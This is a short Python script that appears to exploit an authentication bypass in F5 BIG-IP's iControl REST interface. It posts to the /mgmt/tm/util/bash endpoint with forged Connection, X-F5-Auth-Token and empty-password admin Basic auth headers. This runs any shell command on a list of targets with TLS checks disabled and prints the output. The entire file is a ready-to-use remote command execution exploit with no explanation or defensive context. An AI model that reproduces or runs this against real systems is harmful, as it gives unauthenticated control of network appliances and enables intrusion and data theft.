import requests
import json

result = ""
verbose = True

def vprint(status):
    global result
    result = f"{result}\n{status}"
    #result.append(status)
    if verbose:
        print(status)

def headers():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'a',
        'Authorization': 'Basic YWRtaW46'
    }
    return headers

def check_for_cve(target, cmd="id -a"):
    attack_url = f"{target}/mgmt/tm/util/bash"
    data = {'command' : 'run', 'utilCmdArgs': f"-c {cmd}"}
    try:
        response = requests.post(attack_url, json=data, headers=headers(), verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            vprint(display)
        else:
            vprint(f"Target: {attack_url} does not appear vulnerable")
    except Exception as e:
        vprint(f"Error: An execption was raised. {e}")


def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        vprint(f"Error: URL incorrect {url}")
        
def main(targets, payload):
    global result
    result = ""
    for target in targets:
        vprint(f"[!] Checking {target}")
        url = format_url(target)
        check_for_cve(url,payload)
    return result

if __name__ == "__main__":
    main(["localhost:8000"],"id -a")